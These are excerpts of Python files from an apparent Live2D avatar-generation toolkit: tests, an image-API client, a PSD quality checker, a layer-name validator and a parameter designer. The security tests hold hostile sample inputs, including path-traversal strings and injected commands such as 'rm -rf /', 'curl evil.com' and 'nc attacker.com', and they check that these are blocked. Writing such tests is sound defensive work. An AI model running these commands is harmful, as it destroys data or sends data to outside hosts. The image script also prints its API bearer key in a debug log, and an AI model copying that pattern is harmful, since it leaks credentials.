        img = Image.new('RGBA', (100, 150), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        layer_dir = wf._perform_layering(img_path)
        assert layer_dir is not None, '分层失败'
        assert os.path.exists(layer_dir), '分层目录未创建'
        # 检查是否生成了图层文件
        png_files = list(Path(layer_dir).glob('*.png'))
        assert len(png_files) > 0, '未生成任何图层PNG文件'

# ========== 模块5: 主工具 ==========

@test('19. Live2DTool - 完整API')
def test_master_tool():
    from master_tool import Live2DTool, build_prompt, generate_random_features
    tool = Live2DTool(output_dir='/tmp/live2d_test')
    assert hasattr(tool, 'generate'), '缺少generate方法'
    assert hasattr(tool, 'layer'), '缺少layer方法'
    assert hasattr(tool, 'to_psd'), '缺少to_psd方法'
    assert hasattr(tool, 'validate'), '缺少validate方法'
    assert hasattr(tool, 'get_latest'), '缺少get_latest方法'
    # 测试特征生成

...（省略后续 105 行，原文件共 385 行）...

```

## 深度测试（节选）
**文件**：`.trae/skills/live2d-master-agent/test_deep_coverage.py`
```
#!/usr/bin/env python3
"""
深度全覆盖测试 v3.0 - 基于联网搜索最佳实践设计
测试维度：单元测试 + 集成测试 + 边界条件 + 异常处理 + 性能基准 + 安全加固 + 端到端工作流
参考：Python测试金字塔、Live2D官方PSD规范、DevOps测试最佳实践
"""
import sys
import os
import tempfile
import time
import shutil
from pathlib import Path

SKILL_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(SKILL_DIR)
sys.path.insert(0, SKILL_DIR)

errors = []
warnings_list = []
passed = 0
failed = 0

def test(name):
    def decorator(func):
        def wrapper():
            global passed, failed
            try:
                func()
                print(f'  [PASS] {name}')
                passed += 1
                return True
            except AssertionError as e:
                errors.append(f'{name}: {e}')
                print(f'  [FAIL] {name}: {e}')
                failed += 1
                return False
            except Exception as e:
                errors.append(f'{name}: {type(e).__name__}: {e}')
                print(f'  [FAIL] {name}: {type(e).__name__}: {e}')
                failed += 1
                return False
        return wrapper
    return decorator

print('='*70)
print('=== 30项深度全覆盖测试（基于联网搜索最佳实践）===')
print('='*70)

# ========== 模块1: 安全与配置（6项）==========

@test('1. SecureConfig - API密钥格式验证')
def test_secure_config_key_format():
    from config import config
    assert config.has_sensenova_key == True, 'sensenova key未检测到'
    key = config.sensenova_api_key
    assert key is not None and key.startswith('sk-'), f'key格式错误'
    assert len(key) > 20, 'key长度过短'

@test('2. SecureConfig - 密钥不写入os.environ')
def test_secure_config_no_env():
    import os
    from config import config
    assert 'SENSENOVA_API_KEY' not in os.environ, 'API密钥泄露到环境变量'
    assert hasattr(config, '_secrets'), 'SecureConfig应有私有_secrets字典'

@test('3. SecureConfig - 敏感键过滤（边界值）')
def test_secure_config_sensitive():
    from config import config
    assert config._is_sensitive('API_KEY') == True
    assert config._is_sensitive('SECRET_KEY') == True
    assert config._is_sensitive('DEBUG') == False
    assert config._is_sensitive('DATABASE_URL') == False

@test('4. SecurityFixes - 路径遍历防护（多种攻击向量）')
def test_security_path():
    from security_fixes import SecurityFixes
    s = SecurityFixes()
    malicious = ['../etc/passwd', '..\\windows\\system.ini', '/etc/passwd', 'foo/../../../etc/passwd', '\\\\evil.com\\share']
    for path in malicious:
        ok, msg = s.validate_path(path, base_dir='/tmp/test')
        assert ok == False, f'未拦截: {path}'

@test('5. SecurityFixes - 提示词清理（危险字符）')
def test_security_prompt():
    from security_fixes import SecurityFixes
    s = SecurityFixes()
    dangerous = ['test; rm -rf /', 'test && curl evil.com', 'test | nc attacker.com', 'test`whoami`', 'test$(id)']
    for prompt in dangerous:
        clean = s.sanitize_prompt(prompt)
        assert ';' not in clean and '&&' not in clean and '|' not in clean and '`' not in clean, f'清理不彻底: {clean}'

@test('6. SecurityFixes - 模型白名单验证')
def test_security_model():
    from security_fixes import SecurityFixes
    s = SecurityFixes()
    assert s.validate_model('gpt-4o') == True
    assert s.validate_model('evil-model') == False
    assert s.validate_model('') == False

# ========== 模块2: 核心接口与工作流引擎（4项）==========

@test('7. Core Interfaces - 抽象类不可实例化')
def test_core_abstract():
    from core.interfaces import ImageGenerator, LayerSeparator
    try:
        ImageGenerator()
        assert False, 'ImageGenerator应不可实例化'
    except TypeError:
        pass
    try:
        LayerSeparator()
        assert False, 'LayerSeparator应不可实例化'
    except TypeError:
        pass

@test('8. WorkflowContext - 完整数据流')
def test_workflow_context():
    from core.workflow_engine import WorkflowContext
    ctx = WorkflowContext({'initial': 'data'})
    assert ctx.get('initial') == 'data'
    ctx.set('key1', 'value1')
    assert ctx['key1'] == 'value1'
    ctx.update({'key2': 'value2', 'key3': 'value3'})
    assert 'key2' in ctx and 'key3' in ctx
    ctx.log_step('step1', True, 'ok')
    ctx.log_step('step2', False, 'error')
    history = ctx.get_history()
    assert len(history) == 2
    assert history[0]['step'] == 'step1'
    assert history[1]['success'] == False

@test('9. WorkflowEngine - 步骤链式添加')
def test_workflow_engine():
    from core.workflow_engine import WorkflowEngine
    engine = WorkflowEngine('test')
    def step1(): return {'r': 1}
    def step2(): return {'r': 2}
    engine.add_step(step1, 'step1')
    engine.add_step(step2, 'step2')
    assert len(engine.steps) == 2, f'应有2步,实际{len(engine.steps)}'
    assert engine.steps[0]['name'] == 'step1'

@test('10. WorkflowEngine - 重试配置')
def test_workflow_retry():
    from core.workflow_engine import WorkflowEngine
    engine = WorkflowEngine('test')
    assert engine.name == 'test'
    # 验证重试配置存在
    assert hasattr(engine, '_max_retries')
    assert engine._max_retries >= 0

# ========== 模块3: 图像生成（5项）==========

@test('11. PromptEngineer - 中文角色解析')
def test_prompt_chinese():
    from local_image_generator import PromptEngineer
    char = PromptEngineer.parse_character_from_text('蓝发猫耳少女，校服')
    assert char['hair_color'] == 'blue'
    assert 'cat ears' in char['features']
    assert char['clothing'] == 'school uniform'

@test('12. PromptEngineer - 英文角色解析')
def test_prompt_english():
    from local_image_generator import PromptEngineer
    char = PromptEngineer.parse_character_from_text('pink hair, red eyes, maid outfit')
    assert char['hair_color'] == 'pink', f"expected pink, got {char['hair_color']}"
    assert char['eye_color'] == 'red eyes', f"expected red eyes, got {char['eye_color']}"
    assert char['clothing'] == 'maid outfit', f"expected maid outfit, got {char['clothing']}"

@test('13. PromptEngineer - 空字符串处理')
def test_prompt_empty():
    from local_image_generator import PromptEngineer
    char = PromptEngineer.parse_character_from_text('')
    assert char['hair_color'] == ''
    assert char['features'] == []

@test('14. ProviderRouter - Provider列表')
def test_provider_router():
    from local_image_generator import ProviderRouter
    providers = ProviderRouter.get_available_providers()
    assert isinstance(providers, list)
    assert 'sensenova' in providers

@test('15. QualityAssessor - 真实图片评估')
def test_quality_assess():
    from local_image_generator import QualityAssessor
    from PIL import Image
    with tempfile.TemporaryDirectory() as tmpdir:
        img = Image.new('RGBA', (512, 768), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        report = QualityAssessor.assess_live2d_quality(img_path)
        assert 'overall' in report
        assert 'live2d_score' in report
        assert 0 <= report['overall'] <= 1

# ========== 模块4: Live2D工作流（5项）==========

@test('16. Live2DWorkflow - 52层标准结构')
def test_workflow_layers():
    from live2d_workflow import Live2DWorkflow
    wf = Live2DWorkflow()
    assert len(wf.LIVE2D_LAYER_ORDER) == 52
    assert wf.LIVE2D_LAYER_ORDER[0] == '背景'
    assert wf.LIVE2D_LAYER_ORDER[-1] == '阴影_衣服'

@test('17. Live2DWorkflow - PSD标准规范')
def test_workflow_psd_standard():
    from live2d_workflow import Live2DWorkflow
    wf = Live2DWorkflow()
    assert wf.PSD_STANDARD['format'] == 'PSD'
    assert wf.PSD_STANDARD['color_mode'] == 'RGB'
    assert wf.PSD_STANDARD['color_channel'] == '8bit/channel'
    assert wf.PSD_STANDARD['color_profile'] == 'sRGB'

@test('18. Live2DWorkflow - 图像优化（真实数据）')
def test_workflow_optimize():
    from live2d_workflow import Live2DWorkflow
    from PIL import Image
    wf = Live2DWorkflow()
    with tempfile.TemporaryDirectory() as tmpdir:
        img = Image.new('RGBA', (200, 300), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        opt_path = wf._optimize_image(img_path)
        assert os.path.exists(opt_path)
        opt_img = Image.open(opt_path)
        assert opt_img.mode == 'RGBA'

@test('19. Live2DWorkflow - 分层处理（真实数据）')
def test_workflow_layering():
    from live2d_workflow import Live2DWorkflow
    from PIL import Image
    wf = Live2DWorkflow(k_clusters=3)
    with tempfile.TemporaryDirectory() as tmpdir:
        img = Image.new('RGBA', (100, 150), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        layer_dir = wf._perform_layering(img_path)
        assert layer_dir is not None
        assert os.path.exists(layer_dir)
        png_files = list(Path(layer_dir).glob('*.png'))
        assert len(png_files) > 0

@test('20. Live2DWorkflow - 端到端PSD生成')
def test_workflow_psd():
    from live2d_workflow import Live2DWorkflow
    from PIL import Image
    wf = Live2DWorkflow(k_clusters=3)
    with tempfile.TemporaryDirectory() as tmpdir:
        img = Image.new('RGBA', (200, 300), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        layer_dir = wf._perform_layering(img_path)
        psd_path = wf.create_layered_psd(layer_dir)
        assert psd_path is not None

# ========== 模块5: 主工具（3项）==========

@test('21. Live2DTool - API完整性')
def test_master_tool_api():
    from master_tool import Live2DTool
    tool = Live2DTool(output_dir='/tmp/live2d_test')
    assert hasattr(tool, 'generate')
    assert hasattr(tool, 'layer')
    assert hasattr(tool, 'to_psd')
    assert hasattr(tool, 'validate')
    assert hasattr(tool, 'get_latest')

@test('22. Live2DTool - 随机特征生成')
def test_master_tool_features():
    from master_tool import generate_random_features
    features = generate_random_features()
    assert 'hairstyle' in features
    assert 'hair_color' in features
    assert 'eye_color' in features
    assert 'clothing' in features

@test('23. Live2DTool - 提示词构建')
def test_master_tool_prompt():

...（省略后续 158 行，原文件共 438 行）...

```

## Seedream 生成脚本（节选）
**文件**：`.trae/skills/live2d-master-agent/scripts/seedream_image_generate.py`
```
#!/usr/bin/env python3
# Copyright (c) 2026 Beijing Volcano Engine Technology Co., Ltd. and/or its affiliates.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
byted-seedream-image-generate - Generate high-quality images from text prompts
using Volcano Engine Seedream models. Supports 4.0, 4.5, and 5.0-lite versions.
"""

import argparse
import asyncio
import json
import os
import sys
from typing import Dict, List, Tuple

import httpx

# Configuration constants
API_KEY = (
    os.getenv("ARK_API_KEY")
    or os.getenv("MODEL_IMAGE_API_KEY")
    or os.getenv("MODEL_AGENT_API_KEY")
)
API_BASE = (
    os.getenv("ARK_BASE_URL")
    or os.getenv("MODEL_IMAGE_API_BASE")
    or "https://ark.cn-beijing.volces.com/api/v3"
).rstrip("/")
API_BASE = API_BASE.replace("/api/coding/v3", "/api/v3")

# Model names for each version
MODELS = {
    "4.0": "doubao-seedream-4-0-250828",
    "4.5": "doubao-seedream-4-5-251128",
    "5.0": "doubao-seedream-5-0-260128",
}

# Supported fields per version (based on official documentation)
SUPPORTED_FIELDS = {
    "4.0": [
        "size",
        "response_format",
        "watermark",
        "image",
        "sequential_image_generation",
        "sequential_image_generation_options",
        "stream",
        "optimize_prompt_options",
    ],
    "4.5": [
        "size",
        "response_format",
        "watermark",
        "image",
        "sequential_image_generation",
        "sequential_image_generation_options",
        "stream",
        "optimize_prompt_options",
    ],
    "5.0": [
        "size",
        "response_format",
        "watermark",
        "image",
        "sequential_image_generation",
        "sequential_image_generation_options",
        "tools",
        "output_format",
        "stream",
        "optimize_prompt_options",
    ],
}

# Version descriptions
VERSION_DESCRIPTIONS = {
    "4.0": "Seedream 4.0 - Stable and reliable for daily use, fast response (does not support tools and output_format)",
    "4.5": "Seedream 4.5 - Better detail performance, improved complex scene handling (does not support tools and output_format)",
    "5.0": "Seedream 5.0 - The strongest version currently available! Breakthrough creative expression and ultra-high quality details! The only version that supports tools and output_format!",
}

def _get_headers() -> dict:
    """
    Build API request headers
    """
    if not API_KEY:
        raise ValueError(
            "Please set ARK_API_KEY or MODEL_IMAGE_API_KEY or MODEL_AGENT_API_KEY environment variable"
        )
    return {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {API_KEY}",
    }

def _build_request_body(item: dict, model_name: str, version: str) -> dict:
    """
    Build API request body
    Only add parameters supported by the selected version
    """
    print("\n" + "="*80)
    print("📋 构建请求体 - 输入参数:")
    print("="*80)
    print(f"item: {json.dumps(item, indent=2, ensure_ascii=False, default=str)}")
    print(f"model_name: {model_name}")
    print(f"version: {version}")
    print("="*80 + "\n")
    
    body = {
        "model": model_name,
        "prompt": item.get("prompt", ""),
    }

    # Only add optional parameters supported by the current version
    supported_fields = SUPPORTED_FIELDS.get(version, [])
    for field in supported_fields:
        if field in item and item[field] is not None:
            body[field] = item[field]

    # Handle sequential_image_generation options for batch generation
    if item.get("sequential_image_generation") == "auto":
        options = dict(item.get("sequential_image_generation_options") or {})
        if "max_images" in item:
            options["max_images"] = item["max_images"]
        if options:
            body["sequential_image_generation_options"] = options

    print("\n" + "="*80)
    print("✅ 构建请求体 - 最终输出:")
    print("="*80)
    print(f"body: {json.dumps(body, indent=2, ensure_ascii=False, default=str)}")
    print("="*80 + "\n")
    
    return body

async def _call_image_api(item: dict, model_name: str, version: str, timeout: int) -> dict:
    """
    Call image generation API"""
    url = f"{API_BASE}/images/generations"
    body = _build_request_body(item, model_name, version)
    
    # 打印完整请求入参
    print("\n" + "="*80)
    print("📤 完整 API 请求入参:")
    print("="*80)
    print(f"URL: {url}")
    print(f"Headers: {json.dumps(_get_headers(), indent=2, ensure_ascii=False)}")
    print(f"Request Body: {json.dumps(body, indent=2, ensure_ascii=False)}")
    print("="*80 + "\n")

    async with httpx.AsyncClient(timeout=float(timeout)) as client:
        response = await client.post(url, headers=_get_headers(), json=body)
        response.raise_for_status()
        return response.json()

async def handle_single_task(
    idx: int,
    item: dict,
    model_name: str,
    version: str,
    timeout: int,
) -> Tuple[List[dict], List[str], List[dict]]:
    """
    Handle a single image generation task"""
    success_list = []
    error_list = []
    error_detail_list = []

    try:
        response = await _call_image_api(item, model_name, version, timeout)

        if "error" not in response:
            data_list = response.get("data", [])
            for i, image_data in enumerate(data_list):
                image_name = f"task_{idx}_image_{i}"

                # Check if image has error
                if "error" in image_data:
                    error_list.append(image_name)
                    error_detail_list.append(
                        {
                            "task_idx": idx,
                            "image_name": image_name,
                            "error": image_data.get("error"),
                        }
                    )
                    continue

                # Get image URL or Base64 data
                image_url = image_data.get("url")
                if image_url:
                    success_list.append({image_name: image_url})
                else:
                    b64 = image_data.get("b64_json")
                    if b64:
                        output_format = item.get("output_format")
                        mime_type = "image/jpeg" if output_format == "jpeg" else "image/png"
                        success_list.append(
                            {image_name: f"data:{mime_type};base64,{b64}"}
                        )
                    else:
                        error_list.append(image_name)
                        error_detail_list.append(
                            {
                                "task_idx": idx,
                                "image_name": image_name,
                                "error": "missing data (no url/b64)",
                            }
                        )
        else:
            # API returned error
            error_info = response.get("error", {})
            error_list.append(f"task_{idx}")
            error_detail_list.append({"task_idx": idx, "error": error_info})

    except Exception as e:
        # Handle exception
        error_list.append(f"task_{idx}")
        error_detail_list.append({"task_idx": idx, "error": str(e)})

    return success_list, error_list, error_detail_list

async def seedream_generate(
    tasks: List[dict],
    version: str = "5.0",
    timeout: int = 1200,
) -> Dict:
    """
    Main function for byted-seedream-image-generate
    
    One skill supporting three versions! Choose the appropriate version based on your needs!
    Automatically filters unsupported parameters based on version!
    
    Based on official API documentation:
    - Seedream 4.0/4.5: Do not support tools and output_format parameters
    - Seedream 5.0-lite: Supports all parameters including tools and output_format
    
    Args:
        tasks: List of tasks, each task is a dictionary
        version: Version selection: "4.0", "4.5", or "5.0" (default 5.0)
        timeout: Timeout in seconds, default 1200 seconds
    
    Returns:
        Dictionary containing generation results
    """
    # Validate version
    if version not in MODELS:
        return {
            "status": "error",
            "success_list": [],
            "error_list": [f"Unsupported version: {version}, please choose 4.0, 4.5, or 5.0"],
            "error_detail_list": [{"error": "Invalid version"}],
        }

    if not API_KEY:
        return {
            "status": "error",
            "success_list": [],
            "error_list": ["Missing API key, please set ARK_API_KEY or MODEL_IMAGE_API_KEY or MODEL_AGENT_API_KEY"],
            "error_detail_list": [{"error": "Missing API key"}],
        }

    model_name = MODELS[version]
    success_list = []
    error_list = []
    error_detail_list = []

    # Process all tasks concurrently
    coroutines = [
        handle_single_task(idx, item, model_name, version, timeout) 

...（省略后续 220 行，原文件共 500 行）...

```

## 质量检查引擎（节选）
**文件**：`.trae/skills/live2d-master-agent/scripts/qa_engine_enhanced.py`
```
#!/usr/bin/env python3
"""
Live2D PSD 质量检查工具 - 增强版
版本: 2.0
功能: 全面的 PSD 质量检查，包括遮挡关系、透明度、混合模式、分辨率等
"""

import json
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field


@dataclass
class QAIssue:
    """质量问题"""
    severity: str  # error, warning, info
    category: str  # naming, structure, transparency, blend, resolution, occlusion
    message: str
    layer: Optional[str] = None
    suggestion: str = ""
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class QAReport:
    """质量检查报告"""
    score: int
    issues: List[QAIssue]
    passed: bool
    statistics: Dict[str, Any]
    recommendations: List[str]


class EnhancedQAEngine:
    """增强版质量检查引擎"""
    
    def __init__(self):
        self.issues: List[QAIssue] = []
        self.statistics: Dict[str, Any] = {}
        
        # 标准图层命名规范
        self.standard_layers = {
            'head': ['hair_front', 'hair_back', 'hair_side', 'face_base', 'face_shadow'],
            'eyes': ['eye_l_white', 'eye_r_white', 'eye_l_iris', 'eye_r_iris', 
                    'eye_l_pupil', 'eye_r_pupil', 'eye_l_highlight', 'eye_r_highlight'],
            'mouth': ['mouth_base', 'mouth_a', 'mouth_i', 'mouth_u', 'mouth_e', 'mouth_o'],
            'body': ['body_front', 'body_back', 'neck', 'arm_front_l', 'arm_front_r', 
                    'arm_back_l', 'arm_back_r'],
            'clothes': ['clothes_top', 'clothes_bottom', 'skirt', 'accessory'],
            'eyebrows': ['eyebrow_l', 'eyebrow_r'],
            'nose': ['nose']
        }
        
        # 标准 Draw Order
        self.standard_draw_order = {
            'hair_back': 10,
            'body_back': 20,
            'arm_back_l': 25,
            'arm_back_r': 26,
            'skirt': 30,
            'body_front': 40,
            'arm_front_l': 45,
            'arm_front_r': 46,
            'neck': 50,
            'face_base': 60,
            'face_shadow': 61,
            'eye_l_white': 70,
            'eye_r_white': 71,
            'eye_l_iris': 72,
            'eye_r_iris': 73,
            'eye_l_pupil': 74,
            'eye_r_pupil': 75,
            'eye_l_highlight': 76,
            'eye_r_highlight': 77,
            'eyebrow_l': 80,
            'eyebrow_r': 81,
            'nose': 85,
            'mouth_base': 90,
            'mouth_a': 91,
            'mouth_i': 92,
            'mouth_u': 93,
            'mouth_e': 94,
            'mouth_o': 95,
            'hair_front': 100,
            'accessory': 110
        }
    
    def check_all(self, psd_data: Dict[str, Any]) -> QAReport:
        """执行所有检查"""
        self.issues = []
        
        # 1. 图层命名检查
        self._check_layer_naming(psd_data)
        
        # 2. 图层结构检查
        self._check_layer_structure(psd_data)
        
        # 3. 遮挡关系分析
        self._check_occlusion(psd_data)
        
        # 4. 透明度检查
        self._check_transparency(psd_data)
        
        # 5. 混合模式检查
        self._check_blend_modes(psd_data)
        
        # 6. 分辨率检查
        self._check_resolution(psd_data)
        
        # 7. Draw Order 检查
        self._check_draw_order(psd_data)
        
        # 计算分数
        score = self._calculate_score()
        
        # 生成建议
        recommendations = self._generate_recommendations()
        
        return QAReport(
            score=score,
            issues=self.issues,
            passed=score >= 70,
            statistics=self.statistics,
            recommendations=recommendations
        )
    
    def _check_layer_naming(self, psd_data: Dict[str, Any]):
        """检查图层命名规范"""
        layers = psd_data.get('layers', [])
        
        for layer in layers:
            name = layer.get('name', '')
            
            # 检查是否使用中文
            if any('\u4e00' <= char <= '\u9fff' for char in name):
                self.issues.append(QAIssue(
                    severity='error',
                    category='naming',
                    message=f'图层名包含中文: {name}',
                    layer=name,
                    suggestion='请使用英文命名，如: hair_front_01'
                ))
            
            # 检查是否包含空格
            if ' ' in name:
                self.issues.append(QAIssue(
                    severity='warning',
                    category='naming',
                    message=f'图层名包含空格: {name}',
                    layer=name,
                    suggestion='请使用下划线代替空格，如: hair_front'
                ))
            
            # 检查是否以数字开头
            if name and name[0].isdigit():
                self.issues.append(QAIssue(
                    severity='warning',
                    category='naming',
                    message=f'图层名以数字开头: {name}',
                    layer=name,
                    suggestion='图层名应以字母开头'
                ))
    
    def _check_layer_structure(self, psd_data: Dict[str, Any]):
        """检查图层结构完整性"""
        layers = psd_data.get('layers', [])
        layer_names = [l.get('name', '').lower() for l in layers]
        
        # 检查必需的图层
        required_categories = ['head', 'eyes', 'mouth', 'body']
        
        for category in required_categories:
            required_layers = self.standard_layers.get(category, [])
            found = False
            
            for required in required_layers:
                if any(required in name for name in layer_names):
                    found = True
                    break
            
            if not found:
                self.issues.append(QAIssue(
                    severity='warning',
                    category='structure',
                    message=f'缺少 {category} 相关图层',
                    suggestion=f'建议添加: {", ".join(required_layers[:3])}'
                ))
        
        self.statistics['total_layers'] = len(layers)
        self.statistics['categories_found'] = sum(
            1 for cat in required_categories 
            if any(any(req in name for name in layer_names) for req in self.standard_layers.get(cat, []))
        )
    
    def _check_occlusion(self, psd_data: Dict[str, Any]):
        """分析遮挡关系"""
        layers = psd_data.get('layers', [])
        
        # 按 Draw Order 排序
        sorted_layers = sorted(
            layers,
            key=lambda l: l.get('drawOrder', 0)
        )
        
        # 检测潜在的遮挡问题
        for i, layer1 in enumerate(sorted_layers):
            for layer2 in sorted_layers[i+1:]:
                # 检查是否有重叠区域
                if self._layers_overlap(layer1, layer2):
                    name1 = layer1.get('name', '')
                    name2 = layer2.get('name', '')
                    order1 = layer1.get('drawOrder', 0)
                    order2 = layer2.get('drawOrder', 0)
                    
                    # 检查是否符合预期的遮挡关系
                    expected_order1 = self.standard_draw_order.get(name1.lower(), 0)
                    expected_order2 = self.standard_draw_order.get(name2.lower(), 0)
                    
                    if expected_order1 > expected_order2 and order1 < order2:
                        self.issues.append(QAIssue(
                            severity='warning',
                            category='occlusion',
                            message=f'遮挡关系可能有问题: {name1} 应在 {name2} 上方',
                            suggestion=f'建议调整 Draw Order: {name1} > {name2}'
                        ))
        
        self.statistics['occlusion_checks'] = len(layers) * (len(layers) - 1) // 2
    
    def _layers_overlap(self, layer1: Dict, layer2: Dict) -> bool:
        """检查两个图层是否重叠"""
        # 简化版：假设所有图层都有重叠
        # 实际实现需要检查边界框
        bounds1 = layer1.get('bounds', {})
        bounds2 = layer2.get('bounds', {})
        
        if not bounds1 or not bounds2:
            return True  # 无法确定，假设重叠
        
        # 检查边界框是否相交
        x1_max = bounds1.get('right', 0)
        x1_min = bounds1.get('left', 0)
        y1_max = bounds1.get('bottom', 0)
        y1_min = bounds1.get('top', 0)
        
        x2_max = bounds2.get('right', 0)
        x2_min = bounds2.get('left', 0)
        y2_max = bounds2.get('bottom', 0)
        y2_min = bounds2.get('top', 0)
        
        return not (x1_max < x2_min or x2_max < x1_min or 
                   y1_max < y2_min or y2_max < y1_min)
    
    def _check_transparency(self, psd_data: Dict[str, Any]):
        """检查透明度设置"""
        layers = psd_data.get('layers', [])
        
        for layer in layers:
            name = layer.get('name', '')
            opacity = layer.get('opacity', 255)
            
            # 检查半透明图层
            if 0 < opacity < 255:
                opacity_percent = (opacity / 255) * 100
                self.issues.append(QAIssue(
                    severity='info',
                    category='transparency',
                    message=f'图层 {name} 透明度为 {opacity_percent:.1f}%',
                    layer=name,
                    suggestion='Live2D 通常建议使用完全不透明图层',
                    details={'opacity': opacity_percent}
                ))
            
            # 检查完全透明图层
            if opacity == 0:
                self.issues.append(QAIssue(
                    severity='warning',
                    category='transparency',
                    message=f'图层 {name} 完全透明',
                    layer=name,

...（省略后续 219 行，原文件共 499 行）...

```

## 图层检查器（节选）
**文件**：`.trae/skills/live2d-master-agent/scripts/layer_checker.py`
```
#!/usr/bin/env python3
"""
图层检查脚本
用于检查 PSD 图层是否符合规范
"""

import re


def check_layer_name(name: str) -> tuple[bool, str]:
    """
    检查图层名是否符合规范
    :param name: 图层名
    :return: (是否符合, 问题描述)
    """
    # 允许的命名模式
    patterns = [
        r"^hair_(front|back|side)_(l|r|)?_\d{2}$",
        r"^hair_(front|back|side)_\d{2}$",
        r"^face_(base|shadow)$",
        r"^eye_(l|r)_(white|iris|pupil)$",
        r"^mouth_(base|a|i|u|e|o)$",
        r"^body_(base|shadow)$",
        r"^clothes_.*$"
    ]
    
    for pattern in patterns:
        if re.match(pattern, name):
            return True, ""
    
    return False, "图层名不符合规范"


def check_layer_list(layers: list[str]) -> list[tuple[str, str]]:
    """
    检查多个图层
    :param layers: 图层名列表
    :return: 问题列表 [(图层名, 问题), ...]
    """
    issues = []
    for layer in layers:
        valid, issue = check_layer_name(layer)
        if not valid:
            issues.append((layer, issue))
    return issues


if __name__ == "__main__":
    print("Live2D 图层检查工具")
    print("-----------------")
    
    test_layers = [
        "hair_front_01",
        "hair_back_02",
        "face_base",
        "eye_l_white",
        "mouth_a",
        "bad_layer_name!",
        "eye_left"
    ]
    
    issues = check_layer_list(test_layers)
    
    if issues:
        print("\n发现问题：")
        for layer, issue in issues:
            print(f"  - {layer}: {issue}")
    else:
        print("\n所有图层名符合规范！")

```

## 参数设计器（节选）
**文件**：`.trae/skills/live2d-master-agent/scripts/parameter_designer_enhanced.py`
```
#!/usr/bin/env python3
"""
Live2D Cubism 参数设计工具 - 增强版
版本: 2.0
功能: 预设参数模板、参数组合建议、表情参数设计
"""

import json
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class Parameter:
    """Cubism 参数"""
    name: str
    min_value: float
    max_value: float
    default_value: float
    description: str
    category: str  # angle, eye, mouth, body, expression
    is_standard: bool = True


@dataclass
class ParameterTemplate:
    """参数模板"""
    name: str
    description: str
    parameters: List[Parameter]
    suitable_for: List[str]  # 适用角色类型


@dataclass
class ExpressionConfig:
    """表情配置"""
    name: str
    parameters: Dict[str, float]
    intensity: float = 1.0


class EnhancedParameterDesigner:
    """增强版参数设计器"""
    
    def __init__(self):
        self.templates: List[ParameterTemplate] = []
        self._load_standard_parameters()
        self._load_templates()
    
    def _load_standard_parameters(self):
        """加载标准 Cubism 参数"""
        self.standard_params = {
            # 角度参数
            'angle': [
                Parameter('ParamAngleX', -30, 30, 0, '头部左右转动', 'angle'),
                Parameter('ParamAngleY', -30, 30, 0, '头部上下转动', 'angle'),
                Parameter('ParamAngleZ', -30, 30, 0, '头部倾斜', 'angle'),
            ],
            # 眼睛参数
            'eye': [
                Parameter('ParamEyeLOpen', 0, 1, 1, '左眼睁开程度', 'eye'),
                Parameter('ParamEyeROpen', 0, 1, 1, '右眼睁开程度', 'eye'),
                Parameter('ParamEyeBallX', -1, 1, 0, '眼球左右移动', 'eye'),
                Parameter('ParamEyeBallY', -1, 1, 0, '眼球上下移动', 'eye'),
                Parameter('ParamEyeBallForm', 0, 1, 0, '眼球形状变化', 'eye'),
            ],
            # 眉毛参数
            'eyebrow': [
                Parameter('ParamBrowLY', -1, 1, 0, '左眉上下移动', 'expression'),
                Parameter('ParamBrowRY', -1, 1, 0, '右眉上下移动', 'expression'),
                Parameter('ParamBrowLX', -1, 1, 0, '左眉左右移动', 'expression'),
                Parameter('ParamBrowRX', -1, 1, 0, '右眉左右移动', 'expression'),
                Parameter('ParamBrowLAngle', -1, 1, 0, '左眉角度', 'expression'),
                Parameter('ParamBrowRAngle', -1, 1, 0, '右眉角度', 'expression'),
            ],
            # 嘴巴参数
            'mouth': [
                Parameter('ParamMouthOpenY', 0, 1, 0, '嘴巴张开程度', 'mouth'),
                Parameter('ParamMouthForm', -1, 1, 0, '嘴巴形状（-1撇嘴，1微笑）', 'mouth'),
                Parameter('ParamMouthForm2', 0, 1, 0, '嘴巴形状变化2', 'mouth'),
            ],
            # 身体参数
            'body': [
                Parameter('ParamBodyAngleX', -10, 10, 0, '身体左右转动', 'body'),
                Parameter('ParamBodyAngleY', -10, 10, 0, '身体前后倾斜', 'body'),
                Parameter('ParamBodyAngleZ', -10, 10, 0, '身体侧倾', 'body'),
                Parameter('ParamBreath', 0, 1, 0, '呼吸动画', 'body'),
            ],
            # 特殊参数
            'special': [
                Parameter('ParamHairFront', -1, 1, 0, '前发飘动', 'body'),
                Parameter('ParamHairBack', -1, 1, 0, '后发飘动', 'body'),
                Parameter('ParamHairSide', -1, 1, 0, '侧发飘动', 'body'),
                Parameter('ParamArmLA', 0, 1, 0, '左臂动作', 'body'),
                Parameter('ParamArmRA', 0, 1, 0, '右臂动作', 'body'),
            ]
        }
    
    def _load_templates(self):
        """加载预设模板"""
        self.templates = [
            # 基础模板
            ParameterTemplate(
                name='基础模板',
                description='适合所有角色的基础参数配置',
                parameters=(
                    self.standard_params['angle'] +
                    self.standard_params['eye'] +
                    self.standard_params['mouth'] +
                    self.standard_params['body']
                ),
                suitable_for=['所有角色']
            ),
            # 标准模板
            ParameterTemplate(
                name='标准模板',
                description='包含眉毛和基础物理的标准配置',
                parameters=(
                    self.standard_params['angle'] +
                    self.standard_params['eye'] +
                    self.standard_params['eyebrow'] +
                    self.standard_params['mouth'] +
                    self.standard_params['body']
                ),
                suitable_for=['标准角色', 'VTuber']
            ),
